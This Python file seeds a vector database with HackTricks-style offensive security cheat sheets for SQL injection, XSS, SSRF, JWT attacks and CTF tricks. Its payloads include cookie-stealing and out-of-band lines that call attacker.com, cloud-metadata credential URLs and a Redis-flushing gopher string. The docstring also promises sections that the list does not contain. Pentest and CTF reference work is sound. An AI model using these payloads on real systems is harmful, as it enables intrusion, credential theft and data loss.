"""
HackTricks & Security Knowledge Base Curator
===========================================
Pre-seeds ChromaDB vector database with top Security Cheatsheets:
1. SQL Injection (Bypass, Time-based, Error-based, Out-of-band)
2. XSS (DOM, Stored, Reflected, Filter Bypass, CSP Evasion)
3. SSRF (Cloud Metadata, Internal Subnet Pivot, Protocol Smuggling)
4. Path Traversal & LFI (Nulbyte, Wrapper, Filter Bypass)
5. Command Injection (Bypass Whitespace, Bad Chars, Reverse Shells)
6. JWT Attacks (None alg, Key Confusion, Brute-force)
7. SSTI (Jinja2, Twig, Mako, Freemarker RCE)
8. CTF Tricks (Crypto, Binary Stego, Forensics, Reverse Eng)
"""

SECURITY_KNOWLEDGE_DOCS = [
    {
        "id": "hacktricks_sqli_cheat_sheet",
        "category": "sqli",
        "title": "HackTricks - SQL Injection Bypass & Exploitation",
        "content": """
[SQL Injection Cheat Sheet & WAF Bypass Techniques]
1. Auth Bypass Payloads:
   - ' OR '1'='1' -- 
   - ' OR 1=1--
   - " OR ""="
   - admin'--
   - admin' #
   - ' OR 'a'='a

2. Space Bypass Techniques:
   - Use comments: UNION/**/SELECT/**/user,password/**/FROM/**/users
   - Use tabs/newlines: %09, %0a, %0d, %0b
   - Parentheses: SELECT(username)FROM(users)

3. Error-Based SQLi:
   - Extractvalue: AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))
   - Updatexml: AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)

4. Time-Based Blind SQLi:
   - MySQL: ' AND SLEEP(5) -- 
   - PostgreSQL: '; SELECT pg_sleep(5); --
   - MSSQL: '; WAITFOR DELAY '0:0:5'; --

5. Out-of-Band (OAST) SQLi:
   - MySQL: SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\a'))
   - Oracle: SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com') FROM dual
"""
    },
    {
        "id": "hacktricks_xss_cheat_sheet",
        "category": "xss",
        "title": "HackTricks - XSS & CSP Filter Bypass",
        "content": """
[Cross-Site Scripting (XSS) Filter Bypass & Vectors]
1. Basic Polyglot Payloads:
   - jaVasCript:/*-->*/<svg/onload=alert(1)>
   - "><img src=x onerror=alert(document.domain)>
   - <script>fetch('http://attacker.com/?c='+document.cookie)</script>

2. Event Handlers without <script>:
   - <svg onload=alert(1)>
   - <body onload=alert(1)>
   - <input autofocus onfocus=alert(1)>
   - <details open ontoggle=alert(1)>
   - <iframe src="javascript:alert(1)">

3. Filter Evasion:
   - Case Variation: <sCrIpT>alert(1)</sCrIpT>
   - Obfuscated Eval: String.fromCharCode(97,108,101,114,116,40,49,41)
   - Double URL Encoding: %253Cscript%253Ealert(1)%253C/script%253E
   - SVG Animate: <svg><animate onend=alert(1) attributeName=x dur=1s>

4. CSP Bypass:
   - JSONP Endpoints: Find allowed domain with JSONP callback parameter
   - Base Tag Injection: <base href="http://attacker.com/">
"""
    },
    {
        "id": "hacktricks_ssrf_cheat_sheet",
        "category": "ssrf",
        "title": "HackTricks - Server-Side Request Forgery (SSRF) & Cloud Metadata",
        "content": """
[SSRF Cloud Metadata & IP Bypass Techniques]
1. Cloud Provider Metadata Endpoints:
   - AWS EC2: http://169.254.169.254/latest/meta-data/iam/security-credentials/
   - AWS IMDSv2: Header required `X-aws-ec2-metadata-token: <token>`
   - GCP: http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google)
   - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)
   - DigitalOcean: http://169.254.169.254/metadata/v1.json

2. Localhost IP Bypass Variants:
   - IPv6: http://[::1]/ or http://[::]/
   - Decimal IP: http://2130706433/ (127.0.0.1)
   - Hex IP: http://0x7f000001/
   - Octal IP: http://0177.0.0.1/
   - Domain Redirection: http://spoofed.burpcollaborator.net or http://localtest.me
   - Short URLs: http://0/ or http://127.1

3. Protocol Smuggling (Gopher/DICT):
   - gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
   - dict://127.0.0.1:11211/stat
"""
    },
    {
        "id": "hacktricks_jwt_cheat_sheet",
        "category": "jwt",
        "title": "HackTricks - JWT Authentication Attacks",
        "content": """
[JWT Vulnerability & Exploitation Attacks]
1. None Algorithm Attack:
   - Modify header: {"alg": "none", "typ": "JWT"}
   - Remove signature part (keep trailing dot): header.payload.

2. Key Confusion Attack (RS256 to HS256):
   - Change "alg" from RS256 (asymmetric) to HS256 (symmetric).
   - Sign token using the server's public key (PEM string) as the HMAC secret!

3. Weak HMAC Secret Brute-forcing:
   - hashcat -m 16500 jwt.txt -a 0 passwords.txt
   - john --wordlist=passwords.txt --format=HMAC-SHA256 jwt.txt

4. Claim Tampering:
   - Change "admin": false -> "admin": true
   - Change "user_id": 102 -> "user_id": 1
   - Inject "kid" (Key ID) path traversal: {"kid": "../../dev/null"} with signature signed with empty string!
"""
    },
    {
        "id": "hacktricks_ctf_cheat_sheet",
        "category": "ctf",
        "title": "HackTricks - CTF Crypto & Forensics Tricks",
        "content": """
[CTF Competition Solvers & Shortcuts]
1. Flag Formats & Extraction:
   - Search strings: strings -n 4 challenge.bin | grep -iE 'flag|ctf|pico|htb'
   - Regex pattern: ([a-zA-Z0-9_\-]{3,15}\{[^\}\s]+\})

2. Multi-stage Encoding Chains:
   - Base64 -> Hex -> ROT13 -> Reverse
   - Detect Base64: Ends with = or ==, character set A-Za-z0-9+/
   - Detect Hex: Character set 0-9a-fA-F, length is multiple of 2
   - XOR Single-Byte Brute-Force: Iterate key 0x00 to 0xFF, match 'flag' or '{'

3. Web CTF Tricks:
   - Hidden HTML Comments: grep -rn '<!--' html_source
   - Robots.txt: curl http://target/robots.txt
   - Git repository leakage: wget -r http://target/.git/
   - Cookie Inspection: Base64 decode session cookies
"""
    }
]
